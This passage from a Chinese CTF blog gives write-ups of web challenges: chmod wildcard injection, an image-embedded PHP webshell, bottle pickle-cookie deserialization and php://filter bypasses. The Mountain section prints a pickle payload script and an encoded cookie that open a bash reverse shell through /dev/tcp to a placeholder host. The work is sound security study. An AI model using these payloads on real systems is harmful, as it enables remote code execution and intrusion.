class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line">  <span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">      <span class="comment">// html转义，防止xss</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">htmlspecialchars</span>( <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo &quot;&lt;h1&gt;&quot;.$target_file.&quot;&lt;/h1&gt;&quot;;</span></span><br><span class="line"><span class="variable">$old_path</span> = <span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$target_dir</span>);</span><br><span class="line"><span class="comment">// make unreadable</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;chmod 000 *&#x27;</span>);  <span class="comment">// 没有权限wc</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$old_path</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>思路3(from wp)</p><ol><li><p><strong>也是从权限入手</strong>：<code>chmode 000 *</code>，这里有通配符注入(好像在v1nd哥那里看过)，似乎在5&#x2F;4字符rce里也有过，通配符注入本质时通配符展开的问题</p></li><li><p>这里也不管命令了，本质上是对flag.txt的提权，涉及到了chmod的提权</p><ol><li><code>chmod --help</code>，发现有一个<code>--reference=RFILE</code>，可以将RFILE的权限复制到FILE，也就这个可以提权的了</li><li>我们还未赋值前的话，上传的文件是可读的，那么将上传的文件赋值到flag.txt就可以了，注意ascii码要在f后</li><li><code>&gt;--reference=z.txt</code>，然后<code>&gt;z.txt</code>，访问即可，执行的命令相当于<code>chmod 000 --reference=z.txt flag.txt z.txt</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line">bp = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 上传文件</span></span><br><span class="line">path_upload = <span class="string">&quot;/&quot;</span></span><br><span class="line">file_upload = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (</span><br><span class="line">        <span class="comment">### try</span></span><br><span class="line">        <span class="comment"># &quot;../\x00.txt&quot;, open(&quot;kc1zs4.txt&quot;, &quot;rb&quot;), &quot;text/plain&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">### payload: 要按照顺序</span></span><br><span class="line">        <span class="comment"># &quot;--reference=z.txt&quot;, &quot;&quot;, &quot;text/plain&quot;</span></span><br><span class="line">        <span class="string">&quot;z.txt&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">r = session.post(host+path_upload, files=file_upload, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li><li><p><strong>深入了解bash中的通配符展开</strong></p><ol><li><p>在linux中如bash中shell会尝试将其与当前目录下的文件名进行匹配，并将通配符替换为符合模式的<strong>所有文件名列表</strong></p></li><li><p><strong>命令的本质</strong>: 一系列参数，可以想象一下java main函数的Strings[] args，这里的通配符展开就是将通配符替换为参数，然后传递给命令</p></li><li><p><strong>原理</strong>: 将文件名作为参数，也就是命令了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/test</span><br><span class="line"><span class="built_in">cd</span> /tmp/test</span><br><span class="line">&gt;-al</span><br><span class="line"><span class="built_in">ls</span> *  <span class="comment"># 执行的是ls -al命令</span></span><br></pre></td></tr></table></figure></li><li><p><strong>顺序问题</strong></p><ol><li><strong>对于有’和”引号也是ok的</strong>，可以本地先试一下</li><li>在Bash中，通配符展开（Wildcard Expansion）是按照文件名的字典顺序（lexicographical order，也称为字典序或字母顺序）</li><li>字典顺序基于字符的ASCII值来决定顺序</li></ol></li><li><p>常见通配符</p><table><thead><tr><th>通配符</th><th>作用</th><th>例子</th></tr></thead><tbody><tr><td>*</td><td>匹配零个或多个字符</td><td>ls *</td></tr><tr><td>?</td><td>匹配单个字符</td><td>ls ?</td></tr><tr><td>[abc]</td><td>匹配方括号内的任意一个字符</td><td>ls [abc]</td></tr><tr><td>[a-z]</td><td>匹配指定范围内的任意一个字符</td><td>ls [a-z]</td></tr></tbody></table></li></ol></li></ol></li></ol><h2 id="blogdog-复现-OPEN"><a href="#blogdog-复现-OPEN" class="headerlink" title="blogdog 复现  | OPEN"></a>blogdog 复现  | OPEN</h2><ol><li>一眼就应该是不会的样子emm</li><li>审计一下源码，这里不贴了，有点长<ol><li>留意一下版本信息，可能要打漏洞</li><li>要打xssbot</li><li>用gpt描述一下过程<ol><li>用户提交内容：用户提交了一条包含链接的消息，如 Check out this site: [<a href="https://example.com]">https://example.com]</a>.</li><li>服务器端处理：服务器接收到消息，提取其中的 URL [<a href="https://example.com]，并调用">https://example.com]，并调用</a> xssbot 函数进行检查。</li><li>访问本地服务器：xssbot 函数首先访问本地服务器主页 [<a href="http://localhost:3000/]%EF%BC%8C%E5%B9%B6%E5%9C%A8%E9%A1%B5%E9%9D%A2%E4%B8%8A%E7%9A%84">http://localhost:3000/]，并在页面上的</a> #flag 输入框中输入预定义的 FLAG 值。</li><li>访问目标 URL：然后，xssbot 函数尝试导航到用户提交的目标 URL [<a href="https://example.com]，并在超时时间内尝试加载该页面。">https://example.com]，并在超时时间内尝试加载该页面。</a></li><li>关闭浏览器：无论是否成功加载目标 URL，都会在 TIMEOUT 毫秒后尝试关闭浏览器，释放系统资源。</li></ol></li><li>没搞懂，白给了，复现好</li></ol></li></ol><h2 id="kittyconvert-复现-OPEN"><a href="#kittyconvert-复现-OPEN" class="headerlink" title="kittyconvert 复现 | OPEN"></a>kittyconvert 复现 | OPEN</h2><ol><li><p>可控的输入有</p><ol><li>上传的文件名，但是又preg_replaec和basename</li><li>文件的内容，感觉难以做手脚，数据清洗？</li><li>应该是要结合这两个方面来处理的</li></ol></li><li><p>文件名绕过</p><ol><li>直接上传<code>.php</code></li><li>尝试写入木马<ol><li><p>会写入_get_icon_data()的内容，emm看了一下，上传一个图片马应该就可以，在data区(数据部分)进行写入一句话木马</p></li><li><p>写入数据段<code>&lt;?$_GET[0]($_POST[1]);?&gt;</code></p><ol><li>从网上抄来的脚本，没有打成功，wp里说是又lsb似乎</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;kc1zs4.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol></li><li><p>复现吧</p><ol start="4"><li>思路是不难的，主要是这里需要对文件格式进行了解才可以进行构造，emm学习一下</li></ol></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>submission<ul><li><input checked="" disabled="" type="checkbox"> 通配符注入的思维: 展开，参数与文件名，顺序问题(<strong>这题顺序错了也不行，而且如果实战无法重置环境相当于白白浪费了</strong>)</li><li><input checked="" disabled="" type="checkbox"> 抓重点的思维和问题分类: 权限问题，提权</li></ul><ol><li>本来也是有想到从命令入手的，但是只是一念，还是不能快，思路&gt;行动阿，再仔细看一下*知道有**输入(攻击的可能来源于输入)**可能就可以了</li></ol></li><li>blogdog<ol><li>前端题目，几乎没咋见过，有点意思</li></ol><ul><li><input disabled="" type="checkbox"> nonce [<a href="https://deepinout.com/html/html-questions/398_html_whats_the_purpose_of_the_html_nonce_attribute_for_script_and_style_elements.html]">https://deepinout.com/html/html-questions/398_html_whats_the_purpose_of_the_html_nonce_attribute_for_script_and_style_elements.html]</a></li><li><input disabled="" type="checkbox"> purify.min.js</li><li><input disabled="" type="checkbox"> node项目的项目结构与文件功能</li></ul></li><li>kittyconvert<ul><li><input disabled="" type="checkbox"> 图片马：一些格式的学习</li><li><input disabled="" type="checkbox"> conda源问题</li><li><input disabled="" type="checkbox"> python 重名，还是要package</li></ul></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>[<a href="https://github.com/x3ctf/challenges-2025/blob/main/web/]">https://github.com/x3ctf/challenges-2025/blob/main/web/]</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国城杯24</title>
      <link href="/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/"/>
      <url>/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习一下思路😋</p></blockquote><h2 id="Mountain"><a href="#Mountain" class="headerlink" title="Mountain"></a>Mountain</h2><blockquote><p>无环境，看思路</p></blockquote><ol><li><p>扫目录，三个目录，读注释与源码</p></li><li><p>.&#x2F;display有提示有.png图片，读取有文件读取，目录穿越&#x2F;etc&#x2F;passwd可以，读工作目录&#x2F;proc&#x2F;self&#x2F;cmdline，ban了，&#x2F;proc&#x2F;1&#x2F;cmdline，有python项目(可以看相应包WSGIServer CPython)：python&#x2F;appppp&#x2F;app.py</p></li><li><p>源码审计</p><ol><li>密钥应该可读config.py，session伪造？</li><li>没有什么执行点啊，&#x2F;admin也没有</li><li>猜测出题人意思，考点应该有session，难道有session反序列化？(这里看.&#x2F;hello返回包会有pickle的base64数据格式)<ol><li><p><strong>审计一下flask源码</strong>: pycharm起一个或者vscode起一个，不是源码，读bottle里的request看看(可以读读他的，避免版本)，不对bottle也是框架嘻嘻</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string">    `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string">    :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string">    cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line">value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line"><span class="keyword">if</span> secret:</span><br><span class="line">    <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">    <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">        sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">        <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">            dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">            <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> default</span><br><span class="line"><span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, route, run, template, request, response</span><br><span class="line"><span class="keyword">from</span> config.D0g3_GC <span class="keyword">import</span> Mountain</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">messages = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/hello&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=Mountain)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=Mountain)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>]) <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker!!! I&#x27;ve caught you&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 单纯返回文件内容</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/display&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_image</span>():</span><br><span class="line">    photo = request.query.get(<span class="string">&#x27;photo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> photo <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> template(<span class="string">&#x27;display&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;^../|environ|self&quot;</span>, photo):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker!!! I&#x27;ll catch you no matter what you do!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    requested_path = os.path.join(os.getcwd(), <span class="string">&quot;picture&quot;</span>, photo)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> photo.endswith(<span class="string">&#x27;.png&#x27;</span>):</span><br><span class="line">            default_png_path = <span class="string">&quot;/appppp/picture/&quot;</span></span><br><span class="line">            pngrequested_path = default_png_path + photo</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(pngrequested_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                tfile = f.read()</span><br><span class="line"></span><br><span class="line">            response.content_type = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(requested_path) <span class="keyword">as</span> f:</span><br><span class="line">                tfile = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;you have some errors, continue to try again&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tfile</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/admin&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=Mountain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> template(<span class="string">&quot;administator&quot;</span>, messages=messages)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No permission!!!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8089</span>)   </span><br></pre></td></tr></table></figure></li><li><p>解题</p><ol><li>拿secretkey，读&#x2F;appppp&#x2F;config&#x2F;D0g3_GC.py</li><li>pycharm一个服务拿而已flask的cookie，模仿生成<ol><li>放入name，发送即可<code>&quot;!yy/92kdpkjv1hVsC1Ja/yEUD6qowd3HNgdFsEIPhV8M=?gAWVbwAAAAAAAABdlCiMBG5hbWWUfZRoAYwIYnVpbHRpbnOUjARldmFslJOUjENfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC94eHgveCAwPiYxIicplIWUUpRzZS4=&quot;</code></li></ol></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, route, run, template, request, response</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">Mountain=<span class="string">&quot;M0UNTA1ND0G3GCYYDSP0EM5S20I314Y0UARE50SMAR7&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx/x 0&gt;&amp;1&quot;&#x27;)&quot;&quot;&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/hello&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = &#123;<span class="string">&quot;name&quot;</span>: Evil()&#125;</span><br><span class="line">        response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=Mountain)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker!!! I&#x27;ve caught you&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><h3 id="signal-env"><a href="#signal-env" class="headerlink" title="signal env"></a>signal env</h3><ol><li><code>docker build -t signal .</code></li><li><code>docker run -d -p 5000:80 --name signal-app signal</code></li></ol><h3 id="signal-分析"><a href="#signal-分析" class="headerlink" title="signal 分析"></a>signal 分析</h3><ol><li><p>扫目录，admin.php StoredAccounts.php，.index.php.swp(这里没有扫出来wc) – bsgm?给的源码里根本没有备份文件，不管了</p><ol><li>有用户guest:MyF3iend</li></ol></li><li><p>读文件</p><ol><li><p>&#x2F;guest.php?path&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php 被过滤了，emm，推测一下后面使用的是include</p></li><li><p>&#x2F;guest.php?path&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php ok，因该是base64被过滤了</p><ol><li>idea1: 准确是base, convert, rot被过滤了，似乎不行，wp用到二次url编码，emm，不懂，蹲一下<code>/guest.php?path=php://filter/read=%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=/var/www/html/index.php</code>，这里的&#x2F;var&#x2F;www&#x2F;html可以读出来</li><li>idea2: filter-chain读文件？这里似乎也是可以的，等下读一下</li><li>idea3: filter-chain直接rce？似乎也是可以的</li><li>读文件<ol><li>&#x2F;tmp&#x2F;hello.php</li><li>index.php</li><li>StoredAccounts.php</li><li>admin.php</li></ol></li><li>贴一下关键的代码</li></ol>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只有admin.php是关键的</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged_in&#x27;</span>] !== <span class="literal">true</span> || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Please fill in the username and 